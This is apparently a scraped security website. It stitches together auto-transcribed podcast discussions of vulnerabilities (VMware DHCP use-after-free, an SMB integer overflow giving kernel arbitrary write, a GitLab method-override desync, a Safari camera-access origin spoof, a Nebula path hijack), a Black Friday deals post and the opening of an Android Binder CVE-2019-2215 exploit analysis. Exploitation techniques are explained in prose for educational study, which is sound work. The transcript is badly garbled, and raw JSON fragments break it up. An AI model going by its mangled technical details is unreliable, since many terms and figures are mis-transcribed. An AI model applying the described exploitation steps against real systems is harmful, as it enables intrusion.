change. It's almost like intentionally misleading to make you think that the Mac operating system needs your permission not zoom itself. So there's some shady issues on top of it.

And with that, I mean that definitely limits the usefulness of it in the second one here in terms of its code injection that gives you a mic and camera axis. It's effectively dll injection own OS X OS X does provide a hardened runtime Library validation which prevents prevents you from loading either are only allows you to load Apple libraries or those that are signed by the same team ID as the application itself.

We have a zi zi blog post about a use after free in the VMware Workstation DHCP server, which was submitted to them by an anonymous researcher last month. So unlike some of the zi zi stuff we've covered in the past. This isn't like a working backwards from like a patched it for anything like that. This is an issue that was submitted to them. So the article first does a bit of a dive. Into how the DHCP release message Handler works and the gist of it for understanding the issue is it will end up copying the data from one leash structure to another so like source to a destination and it thusly structure contains various information like the client IP address the hardware address and a unique\", \"start\": 3953.7}, {\"speaker\": 1, \"line\": \" identifier. Yeah, and just and that's the supersede least function as you're saying just copies from basically the old one to the new one, but I think the name kind of met matters are in terms.

They literally just say when those two messages like DHCP discover followed by the release messages repeatedly received this happens. It doesn't really go into why that happens, but eventually it does happen there. Well, yeah, I mean, I'd love to know but I guess if you're writing the exploit, it doesn't really matter.

You ID field didn't point to the same location before calling the free so very simple patch the article didn't go into detail of how to exploit this to perform the VM Escape.

So there were some pocs out the for this bug before But all of them were they were basically just denial-of-service pocs. Nothing forgetting code execution though. The advisory said the code execution was possible because they labeled it as an RC e so this post explores how they actually exploited it to get code execution and not just a Das. So first the detail the specifics of the bog or rather I should say bugs because there's multiple cascading integer overflows in this code. So for those who are watching we can bring up The code on the screen here and you can cause overflows on two different fields in here that can cause like propagate issues further down the line. One of them is on the offset field and the other one is on the original press segment size field and after these guys played with different combinations of overflows for these two Fields. They found the most promising combination was to use a reasonable offset value, but a very large original compressed segment size value and what would happen here is due to the integer. With the addition statement the allocation when it up being\", \"start\": 4537.0}, {\"speaker\": 1, \"line\": \" smaller than yeah so Fields, I do want to interrupt you really quickly and just kind of mention what's going on with this. So you get the SMB packet that comes in and it contains the raw data and obviously it's most that most particles do it includes a header that header your actual data the raw data may be compressed. It may not be or maybe it is always compressed because this sorry this is Function in particular is dealing with stuff as always compressed. It's decompressing the data. So it'll take that raw data. It will allocate a new buffer and then it will take the compressed data. It'll decompress it into that buffer and then it will prepend the raw data any data that was in there. That wasn't compressed. So that's where the header offset is basically saying like all the data before this offset. That's just it's basically it's providing the offset into the data block to where the compressed data starts. So all the information before that offset just gets men copied right into the buffer to the start of the buffer and the compressed that is the compressed into the new buffer starting at that offset. So just to kind of explain something valleys there like the offset is how far into the data block the data that is compressed. That is the original compressed data size value or field is of course, the original compressed data size are segment size, which I think is self-explanatory. And obviously you can control both of those in the header. So deciding all the proof of Concepts just gave it, you know, 0x F of f so minus 1, which of course are like the biggest Value possible or minus one if it's signed effectively overflowing the integer causing a crash when I would try and access this memory eventually or try and write to memory there sir. You can go on though with your explanation.\", \"start\": 4619.7}, {\"speaker\": 3, \"line\": \" Yeah. So like you were saying the POC is a were out there were just a DOT because they used a very large value. We would write way out of bounds of the buffer, but they ended up, you know controlling it more because you do have quite a degree of control over that value and They found that they could actually smash the header that you were talking about of the packet on the Heap. And so they were originally going to try to trigger a use after free because there's a piece of code in the snippet that was on screen that would trigger a free on a certain condition and they were going to try to force that condition with memory corruption, but when they tried it they accidentally ended up finding a far better route to exploit this and they basically found that the decompressed function that gets called updates the final. Sighs value to the compressed buffer size. So the mem copy down below is hit and then they can actually control what buffer is used for that mem copy for the sore for the destination so they can basically get an arbitrary right through the mem copy. So, you know\", \"start\": 4746.1}, {\"speaker\": 1, \"line\": \" the answer so I do want to add in a little bit that they're a little bit I think you kind of skipped over. Okay, so when they have the user buffer, obviously there's that Target buffer that's been allocated. They kind of control the ultimate size of that as we've mentioned because they control you know, the size of the data. That's when we dealing so they know what the size is going to be. So what they're able to do is they control that in such a way that the It can be allocated in several different locations and they talked about this a little bit as I believe there is a pool forward and there's a look aside list for some it all comes down to the different sizes larger. So large applicate our sorry large allocations will just fail anything larger than 16 megabytes medium allocations larger than 1 Megabyte less than 16. We'll use this buffer pool and smaller ones less than Meg will use the look aside list the look aside list that they Implement here includes Med information in line. With the Heap data, so they show it on screen here you end up having the user buffer that gets returned every turns this object that includes a pointer to the actual user buffer and following that buffer at the end of the buffer is an allocation header structure that includes that is kind of the object that gets returned. So Avery turns that allocation header and that includes a pointer over to the user buffer rather than just returning that user buffer, so it's not Not it's not working quite like Matlock. If you're just expecting to return a block of memory returns an object that Sorry, I was distracted by the comment and chat, which I definitely want to deal with after I keep talking about this. But anyway, so the allocation header struck is where they get if I come back up here is where they get the user buffer. Address for so you control the decompressive data or sorry you control the raw data in the packet that's going to be copied to that location. And because the Overflow that you can get with the decompression, When it's decompressing the data you control what that pointer is pointing to. So you control the data that's going to write and you control because of overflowing that metadata in the heat in the heat that they create you control the address. So I just wanted to cover that little detail. That's their overriding an address in kind of like the Heap metadata not in the protocol header.\", \"start\": 4807.2}, {\"speaker\": 3, \"line\": \" Yeah, so, you know when you have arbitrary right in the kernel, it's basically game over that's a very like it's stupidly powerful primitive and they ended up using it.

Yeah, I think that's what's happening there. That being said, I don't think I have much more to add on that. I think we can move on to exploiting parts are differentials and get lab so our next issues directly and get lab and it's from their file upload functionality it seems and it's kind of a cool attack because it's similar to the HTTP desync attacks.

So the work horse Takes that request upload the file and then it rewrites the request and passes it off to get lab rails with the proper path. Now. Normally it wouldn't be possible to control any of the put request from Workhorse to rails as that's all handled internally, but there's an issue due to the method override functionality.\", \"start\": 5250.5}, {\"speaker\": 1, \"line\": \" Well, so I think should also mention here is that we're course is as it's a reverse proxy.

Some of them get do get Modified by Workhorse of this example of all the pull request to the API packages / Conan and whatever path following that all of those end up getting dealt with are getting Modified by Workhorse and then kind of turn into another request that hits the main rails application or the main rails API, but if you unmatched routes and up just being Passed on unmodified two rails. Yeah, that's kind of an important detail here where the desync happens is Workhorse has no knowledge of this method override whereas rails by default has this rack method override middleware that looks for underscore method as a parameter or X HTTP method override as a header, and we've talked about issues with method overrides before. Yep. We have it's definitely it's A common method for I mentioned with dealing with fire web application firewalls that might not be aware of it, you know kind of a similar deal here with the reverse proxy. It's not aware of that. So it seeing it seeing you know, probably a post request or something like that coming through like okay. I don't know how to handle this post request. So I'm not going to worry about it whereas as web servers like oh, hey, I got a pull request because it's get it gets overwritten so you can kind of Maybe start to see where this is going. We're now if you're able to override that request sending some that doesn't get Modified by Workhorse but is still treated as a put a request in the rails application. You might be able to get to start working with another file. Yeah any file. Well, not quite any file. So actually the rails application doesn't completely trust. Just what it gets it actually has a wife list of acceptable paths and it also had slash temp to that but they have a whitelist. So even with that they still kind of protect the endpoint a bit. They don't just trust Workhorse to give it exactly what it needs. Nonetheless. Basically you can still get it to work with basically any file that exists in slash temp or any other acceptable directory. So you would have to know some of those file names you can make some guesses. Is about what might end up in temp? But you would have to know that actually abuse this issue.

It would be surprising anybody ever discovered it but kind of explaining how he got there and through the entire process. It's it was still interesting.

I mean it it exposes a loft that thought process which I think is valuable. I kind of see how you work your way to this fairly complex issue. So starting off with something background with it on OS X and iOS. Basically you have you have the permissions for like an application access the camera needs to have permission to do so. The thing is Apple applications actually. Get that for free. Any Apple application is allowed to access the cameras allowed to basically have some prayer sir. The microphones. The other thing is allowed to access that without actioning to prompt for information. So Safari being an Apple application gets that for free, but it tracks it itself in order to prompt you for for like websites to request specific permission. So going from that that's kind of your background there. Yeah, the that's kind of the security model around. How you get x to the camera? So what this walks through is first of all, it starts looking at how to Safari. Keep track of your website's. How does it know? Why one website is how does it keep track? Thanks for same origin policy and basically they noticed and I'm not going to walk through the entire. An issue, but I'm just going to point out more some highlights, but they noticed in there that when they have like the websites listed, they'd be on like a w-w-w DOT and only example.com would show up. So they kind of notice just how you know, it's probably parsing out for the hostname and what they noticed eventually was that how would parse the host name is it would ignore the protocol so they show the example of going to fake colon slash slash example.com Arm which would count as having example.com open, so it ignored the protocol. So what it did was it would just grab between the colon slash slash and the next / to get the host name? Which kind of makes sense Until you realize that there are some protocols that are supported or pseudo protocols like file / / or blob view Source data things like that or JavaScript would be probably the more common one that don't have a host in it, but it will still load at that same way. Then they kind of talk through how they certain no Singham of some other issues like if you had a domain with a - and a DOT next to each other how it kind of bugs out, but effectively they found for example that they could use file there's a they can use file, you know Skype to Skype.com and it would be loaded as though it's origin was skype.com was the one example that kind of would come up there. However are sorry. They would use JavaScript to change location dot hopes to be skype.com rather than actually doing it in the URL. I'm said they talked about a number of different tricks that they end up using here. So they kind of worked out. So they're able to kind of get control of the origin file while the kind of worked. It doesn't support mobile. So they didn't actually go that route they kind of deep diving into blobs. But what happens with blobs is they end up talking about these opaque origin. So what happens when a blob if you're not familiar with a blob lobs are in JavaScript, you can go and do like a new blob and then give it basically a file that it's going to write and a meta or mime type for it. I can give it that information. Then you can it'll give you a uid that you can then load up as though it were an actual file were an actual URL. So just kind of creates a kind of in memory and you do that with JavaScript. So it's a little bit special. So what happens if you know, how does it get the origin for blobs? and it deep sea dives into that couldn't just You can't just create a blog from skype.com. For example kind of dives into what winds up happening eventually is he figures out that in some cases with The Blob Origins you could end up with a empty origin rather than annul origin or an opaque origin, which just doesn't quite serialize. It actually gets tray is empty were thinks the origin is literally just colon slash slash. so what ends up happening when he's able to trick the origin to be colon slash slash what she ends up only being able to deal with you in theory or he discovered it by only manually typing in the URL not by getting it through any sort of automated means although ends up using another trick to kind of get around that huge using pushstate to effectively change what that Origins up looking like, That ends up happening because you have the colon slash slash as what he thinks. is the origin so then when you use pushstate Interested if you set the push stay to skype.com. We'll just how you change the url without actually changing it's used by gesture. So Ajax stuff, you'll change the url without actually going to make a full request to a new page. You can just change the url kind of magically with JavaScript. That's what pushstate is or part of push States in particular that's changing your history versus replacing I won't go down. Path though, but because of because of finding that blank origin the colon slash slash when he sets the thing to skype.com. It's thinks he's just setting a path not changing the how the other area of safari will actually parse it as the domain being skype.com. Now it thinks it's doing something else. So it sets the path to some like skype.com something that has permission to use the camera. So basically figure out how to programmatically create a document with any sort of spoofed origin is next hurdle was getting around so you can only open the camera webrtc needs to be encrypted needs to be over in theory that's supposed to be needs to be over HTTP and practice files are one place where so file colon slash slash are one place where you'll have I'll say it's not an HTTP request, but you can still open the camera and that's because Safari will trade basically anything that has no origin the file you are eyes data. You are eyes as a secure context and that's obviously there to help developers. That's why files kind of get treated as being as here context even though it's not necessarily secure or at least not here in the sense of being over http. discovers that discovers that you can easily create that sort of opaque or gen using a pop up from a sandbox iframe So if eventually, you know using a pop up from a Sandbox iframe doesn't have any or doesn't have or has an opaque or genset. Then everything I've said above can follow and it's able to basically get your camera access which is the gist of this is any website can open and view your camera.\", \"start\": 5910.3}, {\"speaker\": 3, \"line\": \" That's a lot of work for a\", \"start\": 6392.7}, {\"speaker\": 1, \"line\": \" it's a very good thing and I know I didn't do it justice just because trying to explain everything but he walks through with like if you read through this you'll understand kind of all the details about it.

We've got a hacker one report from James Hancock. This is impacting slack. I believe it was yes lock relative path vulnerability results are results and arbitrary command execution / privilege escalation. $750 Bounty for this it's not on the Like slack client this uses nebula, which is kind of this networking tool that slack has a use between quotes crate like this mutually event K peer-to-peer software defined Network. It's the language out of their GitHub repo for it. Basically created to provide like a mechanism for various groups of host communicate securely across the internet. so nebula in particular just of this issue is really simple. It uses a relative path. When does executable command? It just uses ifconfig or router on Windows uses netsh. It doesn't give the full path or the absolute path like essman ifconfig. So what that means is if you can control the binaries in the path before it finds the original one you're able to get execute. as a privileged user whatever binary you want it to run. So essentially when you call just for ifconfig, for example your systems going to lock a well as iif, it's quite look at your path environment variable. It's going to get all the folders elf that's going to go in order first folder in there is ifconfig in here. No, OK second folder and there's I've config in there. No, OK third folder. Okay. Here's ifconfig. Let's execute that. So an attacker who can place a binary of the same name somewhere in that path before Actual binaries Falcon get to be run. Straightforward issue just use the absolute paths when you're going to execute something don't assume don't assume the setup. It does require obviously somebody that can that's in a position to place a binary but\", \"start\": 6549.3}, {\"speaker\": 3, \"line\": \" Because my path as well, yeah,\", \"start\": 6685.6}, {\"speaker\": 1, \"line\": \" well or place the binary within the path you could modify path. That's the easiest way to deal with just you know, put temp in the path or something and then X here and attempt, but it just needs to be in the past somewhere. So it's like the user doesn't need to be able to do that. They just need to be able to get a file though odds are if you're able to get a file wherever you want with whatever name you want. You probably can also mess at least somewhat with the environment variables. Yeah, although that actually ends up being a point of issue that they have chat with reproducing that. So you can go ahead and just read that they had a little or the triage team had a little bit of issue actually proving. This was an issue just using pseudo because pseudo would use its own path information. It wouldn't what a huge the executing users but The difference being here that it's executing already as privilege and interest executing a Tom either way. You can read about that discussion. I didn't think it was too interesting. I just thought was worth breaking off. Yeah. This is definitely one of those combinations and it's really easy not to make use an absolute path. It's a little bit less portable. But it's better if basically happens on a lot of application and\", \"start\": 6688.3}, {\"speaker\": 3, \"line\": \" straightforward. Yeah, I mean I was a bit surprised considering like the impact is limited because you do need that level of access to pull it off this gets this question because nebula runs as root but I was a bit surprised at the Bounty was as high as it was sudden heard $50, obviously that's cool for the researcher, but it's a bit higher than I was expecting.

Yeah, that being said the severity was taken down. I think initially it was high but before disclosure, they knocked down a bit because of the level of access required to pull it off.

So we're going to cover paper the talks about our favorite types of papers, which is an adversarial attacks against lidar order light detection and ranging detectors for self-driving Vehicles.

I want to say like two episodes ago maybe but hasn't been that long since we have haven't had paper but anyway with this one it's they called a physically realizable adversarial examples for lighter object detection it is not they don't actually realize it physically this they just they do all this digitally to see how it would detect something they don't actually pull this off which is unfortunate but I do like talking about the ones that could be done in the real world it's not it doesn't require access to the Imaging system\", \"start\": 6841.8}, {\"speaker\": 3, \"line\": \" as yes every wire access to the can bus or anything like that\", \"start\": 6888.8}, {\"speaker\": 1, \"line\": \" well I just meant like yeah sometimes the attacks will assume when they're working against the camera in particular you know those whom they can just modify all the pictures Clean like make minor Pixel Perfect modifications. This doesn't this assumes you could put effectively that you could put something on your roof and it will no longer detect you as a car. Yeah, which is the gist of this thing what they noticed was that a lot of training data doesn't include objects on roofs cars, which you know absolutely happens in the real world. Just not so much like it's a little bit uncommon so I can understand that uncommon assuming translate training data where it's just not really there. That's what they do is they digitally manipulate what the point Cloud what if look like and see how it gets detected and I will jump pretty much right to the results unless you have something to say about it Specter.\", \"start\": 6891.9}, {\"speaker\": 3, \"line\": \" I'd wanted to say this this like idea of investigating this route of attacking object detection doesn't seem to be new they do point out to some previous work that was done on it though. They point out that a lot of that previous work was theoretical the attack was using adversarial Point clouds like you were talking about but that match was only being considered for like a few specific frames not like universally for like any scene and the data set was also like very small. So what they're doing isn't entirely like new it has been looked into before but it seems to be like more universally applicable than some of the other papers that have covered it. But yeah, you know,\", \"start\": 6949.7}, {\"speaker\": 1, \"line\": \" yeah, I have to imagine like a lot Of these systems are like they don't have the model that Tesla uses. For example, they are basing that's just off of a more generically trained model and so it is worth pointing out like just because they find these issues doesn't mean it's like, oh, well the next test like you buys necessarily going to do the same thing. This is yeah worth worth mentioning that but getting just right down to it. Basically they just mocked up different objects that could be on your roof and well they started by just mocking him up to see what a would get classified as and it actually did a reasonable job at Detecting the vehicle despite the fact that there is also a couch on the roof or a canoe on the roof, which I you could expect reasonably that\", \"start\": 6992.4}, {\"speaker\": 3, \"line\": \" I don't know.

Do but it looks like you know, the canoe was a little bit malformed or whatever. They found a much greater degree of success like with their adversarial couch. The car would be detected as a couch 68% of the time. So there you are. Just just going down the freeway in your cabinet 54.1% of the time. So yeah, I mean it's it's a straightforward attack here.

No, well. I just like the fact that it is some that could in theory. I have to say it. Theory be done for real in theory be done in practice. It is different from a lot of those attacks. So like I'm not a big fan of those attacks that do require direct access to the data itself being processed. So that's kind of where we're I think this one's kind of different. Yes in this paper. They do directly manipulate that data. I just think they do it in a fair way, you know, they're trying to simulate when you could really do so, I think that's fair like said, you might get pulled over for something unsafe loads, but at the same time You know, you're probably not doing this and just driving down the freeway for hours. It's probably if you were willing to use this and I mean, I don't know if any actual campaign or anything that would have done something like this. Like I guess it wouldn't be a campaign.

And one of the bugs is in the VGA emulation subsystem, and it's an out-of-bounds access. Pallet memory via integer overflow and that memory is used for like pixel entries for DACA dress reading right mode registers. And the problem is they end up using 32-bit indexes when they should have been 8-bit indexes because only values of to hunt to 256 expected and the wraparound is expected on that too. But because they use integers instead of chars or un dates you could actually end up reading or writing out of bounds and because you get those two, To both read and write those two Primitives together very powerful because you can use that to both leak and corrupt Heap data the other bug seem to be unrelated. That was a bug in the firmware configuration device, which allows the guests to retrieve host provided information like the virtual CPU count for example, and it's kind of similar to the first issue its assigned in this issue and one of her Quest structures. So something that should have been unsigned is treated as signed and because of that there's a discrepancy between the allocation a The copy length and you end up getting an overflow this article goes through all the technical details of both vulnerabilities and how the first one can get code execution the second one.

My primary use for it has been while working as a consultant, while I've got plenty of security background, I don't always know the intimate details about a particular technology stack. I would turn to Pluralsight to get up-to-speed on a particular topic before an engagement on a new tech stack. The information certainly is available through some Google searches, the conviennce of having everything readily available and there being some baseline standards upheld by PluralSight's instructors did make it a handy tool. I wouldn't consider it a worthwhile investment if you're looking to learn about security, they are lacking in quality security courses, and those that exist are not really worth it in my opinion.</p>\n<p><strong>Specter</strong> - A lot of PluralSight's security content is focused on web app hacking or network security. While there are a few courses that focus on binary, they're few and far between, and I wouldn't say the subscription is worth it for that alone. Even at the 40% off discount, I'd recommend using the trial to make sure there's enough courses you find interesting before committing to a subscription.</p>\n<hr>\n<p><a href=\"https://www.oreilly.com/online-learning/cybermonday-2019.html\">O'Reilly Online Learning</a></p>\n<p><strong>The Deal</strong> - Annual subscription to the Online Learning program at 50% off ($199)</p>\n<p><strong>zi</strong> - As the name implies, this is an online learning platform, unlike PluralSight, this includes access to books from O'Reilly and other publishers such as No Starch Press and Wiley, two of my favorite tech publishers. One of the most interesting features is the sandbox envrionments they provide (Kubernetes, Python, Tensorflow, and Ubuntu), basically cloud-based VMs running the respective tools that you can access on-demand. They also provide practice tasks and interactive walkthroughs of some basics tasks. While the existing tutorials are quite fundamental, its an interesting setup (using Katacode) that would probably quite useful if you were learning any of the topics covered. For most I think the biggest value comes from the library access and video course access. At roughly $25 a month, its not cheap, but they offer a singificant number of <em>good</em> books, both in general and security related. Basically every book I tend to recommend is on there so its a good library.</p>\n<hr>\n<p><a href=\"https://nostarch.com\">No Starch Press</a></p>\n<p><strong>The Deal</strong> - Last year the deal was 42% off their books, this year hasn't been announced yet, just that they are planning something.</p>\n<p><strong>zi</strong> - No Starch is one of my favorite technology and security book publishers. Many of their books are excellent in quality and enjoyable read. You've probably heard of some of their books such as the XYZ Hacker's Handbook series and the Black Hat and Gray hat {language} series among many other non-series books. If they run another steep discount I'll likely be picking up physical copies of Black Hat Go and Serious Cryptography and I'd recommend taking a look at their library, and maybe asking in our Discord for some book recommendations, they have some great content.</p>\n<hr>\n<p><a href=\"https://pastebin.com/pro\">Pastebin Pro</a></p>\n<p><strong>The Deal</strong> - In past years the deal was $20 for the Lifetime Pro Membership. No indication if it will be the same this year.</p>\n<p><strong>zi</strong> - If you use pastebin, its a pretty good deal. If you don't use pastebin, well, you probably won't benefit from this. Pastebin is basically just a simple website to paste text and share it temporarily. The fact its so simple to use and no authentication necessary has lead pastebin being used to exfiltrate or dump data from compromises leading to a secondary feature of pastebin: keyword monitoring. With a Pro account you get access to alerts on certain key words appearing in a paste and the ability to use their API to scrape data. The last feature of Pro is unlimited unlisted and private pastes that don't show up publically. I know many people in the security industry do use pastebin for quick throw away things so I figured it was worth mentioning here.</p>\n<p><strong>Specter</strong> - The unlimited unlisted and private pastes, the API access, and the larger file limit (10MB as opposed to 500KB) is well worth a lifetime subscription if it's available, however it's not the end of the world if you miss this deal. As zi said, if you're a Pastebin fan, this is probably worth the buy. It's worth noting that there are other paste sites that offer some of what Pastebin pro offers and more for free if you're using Pastebin for it's quick code sharing functionality rather than scraping it.</p>\n<hr>\n<p><a href=\"https://pentesterlab.com/pro\">PentesterLab Pro</a></p>\n<p><strong>The Deal</strong> - 13.37% off annual subscriptions.</p>\n<p><strong>zi</strong> - PentesterLab is another learning platform, this time with a security focus (web application security) and very-much hands on. With a Pro account you get access to a number of web-security 'courses' which are generally short and focused on a single, specific exploit, or attack technique. You are provided with a live, vulnerable envrionment to practice within, as with many things you could go and setup your own VM and attack it yourself, but having one ready for you saves you a ton of time and hassle. I have not used PentesterLab myself so I cnanot comment on the quality of instruction.</p>\n<hr>\n<p><a href=\"https://protonmail.com/blog/black-friday-2019/\">ProtonMail</a></p>\n<p><strong>The Deal</strong> - 33-50% off ProtonMail and ProtonVPN.</p>\n<p><strong>zi</strong> - This is another product I've not used, but I know would be of interest to people who care about security. ProtonMail offers End-To-End encrypted email between ProtonMail customers. You can read more about their security features on their website.</p>\n<hr>\n<p><a href=\"https://store.vmware.com/store?Action=html&amp;Locale=en_US&amp;SiteID=vmware&amp;pbPage=BlackFridaySale\">VMWare Workstation Pro and Fusion pro</a></p>\n<p><strong>The Deal</strong> - 35% off Fusion Pro and Workstation Pro, 30% off the non-pro versions.</p>\n<p><strong>zi</strong> - Running Vms is a constant part of life in the security industry. Maybe I'm running a VM just to have access to some Linux tooling from Windows, or to run some services I'm assessing away from my actual desktop. Whatever the case, VMWare is widely considered the best Desktop VM platform, but its also the most expensive. If you're finding yourself not too happy with Hyper-V, Virtual Box or whatever you use, now would be a good time to atleast checkout VMWare's offering.</p>\n<p><strong>Specter</strong> - VMWare is a daily driver of mine, so unsurprisingly this is another deal that I recommend people interested in security take, especially if you're planning on doing research into kernel development / exploitation, and/or malware research. Between VirtualBox, HyperV, and VMWare, I've found VMWare to be the most performant. The pro editions also allow you to use snapshots which are valuable to quickly get back to work when working on things that could end up crashing the kernel a lot (such as driver development or exploits).</p>\n<hr>\n<p><a href=\"https://shop.hak5.org/\">Hak5</a></p>\n<p><strong>The Deal</strong> - Various discounts on the Hak5 store.</p>\n<p><strong>zi</strong> - If you have a need for their products now is a good time to buy or upgrade to a newer model, if you don't have a need I'd recommend skipping. Hak5 is fairly well known for the Pineapple and for their numerous hacking tools, everything is always pretty decent quality and often has some quality of life improvements over whatever you might make yourself with off-the-shell components. The thing is, for a lot of people they see these things and think about how 'cool' they are or how much of a 'hacker' they'd be if they had it without actually considering any practical usecase. Meaning many purchases just become novelty items collecting dusts on a shelf after a few months. If you have an immediate and known use for them, go ahead and pick something up, but don't waste your money if you don't yet know how you'd use the tools. Its very much for professionals in the sense that the average peope just isn't going to be in a situation to be dropping a rogue AP into a corporate network but a professional might.</p>\n<hr>\n<p><a href=\"https://www.namecheap.com/blog/vault-will-open-black-friday-cyber-monday/\">NameCheap</a></p>\n<p><strong>The Deal</strong> - Various hosting and domain related deals</p>\n<p><strong>zi</strong> - If you want a vanity domain, there are usually good discounts going on and some cheap hosting. Not sure about the quality of hosting through NameCheap, but I've registered a few domains with them without any issues.</p>\n<hr>\n<p><a href=\"https://lowendbox.com\">LowEndBox</a></p>\n<p><strong>The Deal</strong> - Various deals from hosting providers</p>\n<p><strong>zi</strong> - I like to pick up a cheap server ever now and again just to run little scripts, or apps away from my main servers. I wouldn't trust these deals for anything meant for production, but having a server to run some long running scripts/bots/scanners on is nice, and LowEndBox will usually list some very good deals. One of my better deals was a VPS at $60 for 3 years that I've been running a service that is publically used on for nearly 6 years now. Now is also a good time to check with your favorite host to find deals.</p>\n<!--kg-card-end: markdown-->","slug":"black-friday-for-security-professionals"}},{"node":{"title":"Analyzing Android's CVE-2019-2215 (/dev/binder UAF)","path":"/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/","date":"8 November 2019","description":"Over the past few weeks, those of you who frequent the DAY[0] streams over on\nour Twitch may have seen me working on trying to understand the recent Android\nBinder Use-After-Free (UAF) published by Google's Project Zero (p0).

This bug is actually not new, the issue was discovered and fixed in the mainline kernel in February 2018, however, p0 discovered many popular devices did not receive the patch downstream. Some of these devices include the Pixel 2, the Huawei P20, and Samsung Galaxy S7, S8, and S9 phones. I believe many of these devices received security patches within the last couple weeks that finally killed the bug.</p><p>After a few streams of poking around with a kernel debugger on a virtual machine (running Android-x86), and testing with a vulnerable Pixel 2, I've came to understand the exploit written by Jann Horn and Maddie Stone pretty well. Without an understanding of Binder (the <code>binder_thread</code> object specifically), as well as how Vectored I/O works, the exploit can be pretty confusing. It's also quite clever how they exploited this issue, so I thought it would be cool to write up how the exploit works.</p><p>We'll mostly be focusing on how an arbitrary read/write primitive is established, we won't focus on the post-exploit stuff such as disabling SELinux and enabling full root capabilities as there are quite a few write-ups out there already that cover that. Here's a brief overview of what this article will cover:</p><ol><li>Basic overview of Binder and Vectored I/O</li><li>Vulnerability details</li><li>Leaking the kernel task struct</li><li>Establishing an arbitrary read/write (arbitrary r/w) primitive</li><li>Conclusion</li></ol><p>Note that all code snippets will be from kernel v4.4.177, as this is the kernel I tested on personally.</p><h2 id=\"basic-overview-of-binder-and-vectored-i-o\">Basic overview of Binder and Vectored I/O</h2><h4 id=\"binder\">Binder</h4><p>The Binder driver is an Android-only driver which provides an easy method of Inter Process Communication (IPC), including Remote Procedure Calling (RPC). You will find this driver's source code in the mainline Linux kernel, however it is not configured for non-Android builds.</p><p>There are a few different binder device drivers that are used for different types of IPC. For communication between framework and app processes using the Android Interface Definition Language (AIDL), <code>/dev/binder</code> is used. For communication between framework and vendor processes / hardware using the Hardware Abstraction Layer (HAL) Interface Definition Language (HIDL), <code>/dev/hwbinder</code> is used. Finally, for vendors who want to use IPC between vendor processes without using HIDL, <code>/dev/vndbinder</code> is used. For the purposes of the exploit, we only care about the first driver, <code>/dev/binder</code>.</p><p>Like most IPC mechanisms in Linux, binder works through file descriptors, and you can add event polls to it using the EPOLL API.</p><h3 id=\"vectored-i-o\">Vectored I/O</h3><p>Vectored I/O allows you to either write into a data stream using multiple buffers, or read from a data stream into multiple buffers. It's also known as \"scatter/gather I/O\". Vectored I/O offers a few advantages over non-vectored I/O. For one, you can write with or read to different buffers that are non-contiguous without a bunch of overhead. It's also atomic.</p><p>An example of where vectored I/O is useful is a data packet where you have a header followed by data in a contiguous block. Using vectored I/O, you can keep the header and the data in separate, non-contiguous buffers, and read to them or write using them with one system call instead of two.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://i.imgur.com/IFDZCdA.png\" class=\"kg-image\" alt=\"vectored IO diagram\"></figure><p>How this works is you'll define an array of <code>iovec</code> structures which contain information about all the buffers you'd like to use for I/O. The <code>iovec</code> structure is relatively small, consisting only of two QWORDS (8 byte data) on 64-bit systems.</p><pre><code class=\"language-c\">struct iovec { \t\t// Size: 0x10\n    void *iov_base;\t// 0x00\n    size_t iov_len; // 0x08\n}\n</code></pre><h2 id=\"vulnerability-details\">Vulnerability details</h2><p>The Binder driver has a cleanup routine you can trigger from <code>ioctl()</code> before actually closing the driver. If you're familiar with drivers and cleanup routines, you can likely already guess why this is can cause issues.</p><p>Let's look at the p0 report summary.</p><!--kg-card-begin: markdown--><blockquote>\n<p>As described in the upstream commit:</p>\n<p>“binder_poll() passes the thread-&gt;wait waitqueue that<br>\ncan be slept on for work. When a thread that uses<br>\nepoll explicitly exits using BINDER_THREAD_EXIT,<br>\nthe waitqueue is freed, but it is never removed<br>\nfrom the corresponding epoll data structure. When<br>\nthe process subsequently exits, the epoll cleanup<br>\ncode tries to access the waitlist, which results in<br>\na use-after-free.</p>\n</blockquote>\n<!--kg-card-end: markdown--><p>This summary is a bit misleading. The use-after-free is not on the waitqueue itself. The waitqueue is an inline struct in the <code>binder_thread</code> structure, the <code>binder_thread</code> object is what's actually UAF'd. The reason they mention the waitqueue directly in this commit summary is this issue was originally found by Google's Syzkaller fuzzer back in 2017, and the fuzzer triggered a use-after-free detected by the Kernel Address Sanitizer (KASAN) on the waitqueue's mutex.</p><h3 id=\"the-free\">The free</h3><p>Let's take a look at the ioctl command in question, <code>BINDER_THREAD_EXIT</code>.</p><pre><code class=\"language-c\">static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n\t// [...]\n    \n    switch (cmd) {\n\t// [...]\n\tcase BINDER_THREAD_EXIT:\n\t\tbinder_debug(BINDER_DEBUG_THREADS, \"%d:%d exit\\n\",\n\t\t\t     proc-&gt;pid, thread-&gt;pid);\n\t\tbinder_free_thread(proc, thread);\n\t\tthread = NULL;\n\t\tbreak;\n     // [...]\n    }\n}\n\n// [...]\n\nstatic int binder_free_thread(struct binder_proc *proc,\n\t\t\t      struct binder_thread *thread)\n{\n\tstruct binder_transaction *t;\n\tstruct binder_transaction *send_reply = NULL;\n\tint active_transactions = 0;\n\n\t// [...]\n    \n\twhile (t) {\n\t\tactive_transactions++;\n\t\t// [...]\n\t}\n\tif (send_reply)\n\t\tbinder_send_failed_reply(send_reply, BR_DEAD_REPLY);\n\tbinder_release_work(&amp;thread-&gt;todo);\n\tkfree(thread);\n\tbinder_stats_deleted(BINDER_STAT_THREAD);\n\treturn active_transactions;\n}\n</code></pre><p>The critical line of code here is line 2610, <code>kfree(thread)</code>. This is where the \"free\" part of the use-after-free happens.</p><h3 id=\"the-use-after-free-\">The use (after free)</h3><p>Now that we've seen where the free happens, let's try to see where the use happens. The stack trace from the KASAN report will be helpful for this.</p><pre><code class=\"language-text\">Call Trace:\n  ...\n  _raw_spin_lock_irqsave+0x96/0xc0 kernel/locking/spinlock.c:159\n  remove_wait_queue+0x81/0x350 kernel/sched/wait.c:50\n  ep_remove_wait_queue fs/eventpoll.c:595 [inline]\n  ep_unregister_pollwait.isra.7+0x18c/0x590 fs/eventpoll.c:613\n  ep_free+0x13f/0x320 fs/eventpoll.c:830\n  ep_eventpoll_release+0x44/0x60 fs/eventpoll.c:862\n  ...\n</code></pre><p>At first, it can be a bit confusing because the <code>binder_thread</code> object is referenced indirectly, ie. if you ctrl + f for <code>binder_thread</code> you won't find any occurrences. However, if we quickly look at 